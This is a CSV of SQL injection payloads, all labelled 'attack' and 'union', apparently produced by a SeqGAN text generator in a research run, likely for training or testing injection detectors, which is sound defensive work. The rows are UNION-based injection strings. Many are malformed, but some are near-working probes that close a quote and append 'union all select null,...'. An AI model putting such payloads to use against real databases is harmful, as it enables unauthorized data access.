label,payload,family,payload_type,method,run_id,sample_index
attack, all select  * use    ) id  =  =,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,86
attack,"1""   )    )    )    union all select nulld8890+union",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,87
attack,-4966+   )   union all select select us union u,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,88
attack,-5575%'    ) union select select * select select 3339,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,89
attack,",3879' union all all select 7497d  = union =",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,90
attack,-1'+  )   union all select dus =  2774,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,91
attack,"1%'   )   union all select 7845,,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,92
attack,-3781'    )    )    )    )    )    )   )   union ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,93
attack,-3378'   )   union select id   union all select u,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,94
attack,1%'     =   union select 7497d  2571 union select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,95
attack,-r   )union select select users all   =,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,96
attack,-s'   )    )   union all select 2285 id  =,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,97
attack,1%' union all select all id  = 8890   ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,98
attack,1'   )     )   )   union all select ut where ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,99
attack,1' union all select 7497s id   1646  union select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,100
attack,'   )   )    union     )     8890 all select select nulld,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,101
attack,"1%' union select select 8123,null,null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,102
attack,-4330'  )'     3480) union select all select 30847497,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,103
attack,"-6294'where union select 1980 select nulls3339,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,104
attack,"1'' union select u h union select null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,105
attack,-4205)    union select all select 9517  =  =  =,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,106
attack,1'   )   )    )     )   union select u id  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,107
attack,-3781%' union select all select us d  = ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,108
attack,-4966't union select id  2088 union all select ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,109
attack,"1'   )     )   union all select null,null,6996,3990",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,110
attack,-4205' where select ut t id  = union ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,111
attack,d  ) union all select * us union all select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,112
attack,-9860%'   )   union all select select 8268s id,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,113
attack,"1'+union all select us 3084 1917 3480,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,114
attack,1'+   union select ud select id union select ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,115
attack,-4205'    )   )   )   union all where select select ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,116
attack," select 4266,null,4481,9814,null,null,6996,1224,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,117
attack,1' h union select * qeasunion d select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,118
attack,"1' 8890 union all select 2446null,null,null,nullnull",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,119
attack,-3378%' union all select u id all select ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,120
attack," select all select,null,null,null,1224,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,121
attack,1%' union select select select select 1249where id  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,122
attack,"-""' union select 8268 idg d 2011 select ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,123
attack,-3116'  ) union all all select * all 4266 ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,124
attack,"-3378'')   )   union select all all select null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,125
attack,-2207'   )    )   union select * i   select i,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,126
attack,' union select * * us id= union select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,127
attack,-8073%'   union all select id union select 8890 ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,128
attack, select id% 3879 id  2011 2088 union all ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,129
attack,1  )   union all select 3480 id  =  = union,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,130
attack,1%' id unionall select select nulls union all,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,131
attack,"-' union all id  = union select null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,132
attack,-7296%   union all =  =  2011select id union ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,133
attack,-s'' union select us where id   union all,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,134
attack,1')   )   )  )    )   union select where all ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,135
attack,1')   union all select id  7815 union all select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,136
attack,-6294'   )   union all select * idt id,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,137
attack, select select all select 1249s 1494 id  = select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,138
attack,1' union select select 4266s  =select 2774 select null,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,139
attack,-9156'   )    )   union select 7497dt id  union,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,140
attack,-5945''   union all select 74973990  s id 1980,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,141
attack,1'+)   union all select us f2011 ) =,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,142
attack,1134 union = select select 7497s where e select select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,143
attack,-    '   )   union select select all qdes 2774,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,144
attack,1'  )   union 2011 union all select null id ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,145
attack,"-42058308' union select null,null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,146
attack,1%union select us 2285  2011  )    )     union select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,147
attack,1'  )   union all select id  =   union select ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,148
attack,1%%' union select union select us id    ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,149
attack,-)   )     union select d i=  =   union select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,150
attack,"1"" union fi= select 2774  =   ee6996 i",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,151
attack,"-1224'   )   union select l,,null,null,null9814,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,152
attack,"-,t2190' union all all select id  = union",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,153
attack,-7296'   )    '''    )    )   union select select ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,154
attack,"- 2571 union all select nullnull,1297,,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,155
attack,1'   union all select 7497o) select all id  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,156
attack,1'   )' union select' select id  7815    ) ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,157
attack,1')   union select * * us id    7815,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,158
attack,-30841')   union select * select * u  k ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,159
attack,1%'   )    )   union all us =  = =,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,160
attack,"1's union select e,null,null  ,null,null,9357",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,161
attack,-)%'     )   union select union select udid ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,162
attack,"1' union select -,null 9921,2446,9814,8123,2263",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,163
attack,1' union select select * i select id  = ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,164
attack,-2207'   )+union all select select us us ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,165
attack,14205 union select select *us  union 7497d  =,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,166
attack,-4966%' union select u where =  = 2088 select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,167
attack,-4205 union select 7497s id  =   = u ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,168
attack,"1'  )   ) union select select null,3339,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,169
attack,-4205'' 7815 1646 b1134 union all select us,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,170
attack,-2207''   union select all 1441 9517  d select 5756,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,171
attack,-5945%'   union select 7497  = union all select null,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,172
attack," select null,7497,null,null,null,null,null,null,9921",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,173
attack,"-7296""   a4205 union id  =   )        union ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,174
attack,-% union all = from id  = from id,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,175
attack,1' )     union all select where id  = i  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,176
